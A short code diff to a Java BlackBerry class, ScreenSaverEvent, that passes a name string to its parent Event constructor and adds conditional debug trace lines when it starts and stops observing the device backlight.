@@ -27,7 +27,7 @@ public class ScreenSaverEvent extends Event implements BacklightObserver {
     int actionOnExit;
 
     public ScreenSaverEvent(final int actionId, final byte[] confParams) {
-        super(Event.EVENT_SCREENSAVER, actionId, confParams);
+        super(Event.EVENT_SCREENSAVER, actionId, confParams, "ScreenSaverEvent");
         setPeriod(NEVER);
     }
 
@@ -36,6 +36,9 @@ public class ScreenSaverEvent extends Event implements BacklightObserver {
      * @see blackberry.threadpool.TimerJob#actualStart()
      */
     protected final void actualStart() {
+        //#ifdef DEBUG_TRACE
+        debug.trace("actualStart: ScreenSaverEvent");
+        //#endif
         AppListener.getInstance().addBacklightObserver(this);
     }
 
@@ -44,6 +47,9 @@ public class ScreenSaverEvent extends Event implements BacklightObserver {
      * @see blackberry.threadpool.TimerJob#actualStop()
      */
     protected final void actualStop() {
+        //#ifdef DEBUG_TRACE
+        debug.trace("actualStop: ScreenSaverEvent");
+        //#endif
         AppListener.getInstance().removeBacklightObserver(this);
     }
 
